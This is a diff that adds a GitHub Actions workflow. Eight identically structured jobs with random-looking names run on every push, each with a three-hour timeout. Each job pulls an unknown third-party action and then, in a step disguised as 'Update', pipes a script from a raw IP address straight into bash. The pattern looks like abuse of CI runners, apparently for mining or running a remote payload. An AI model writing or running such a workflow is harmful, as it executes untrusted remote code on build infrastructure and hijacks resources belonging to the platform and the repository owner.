@@ -1,0 +1,75 @@
+name: sogofi
+on: push
+jobs:
+  pagiku:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
+  futimehi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
+  ziwico:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
+  lelitafe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
+  razoxace:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
+  focewu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
+  vozeto:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
+  gusaze:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=kuba | bash -
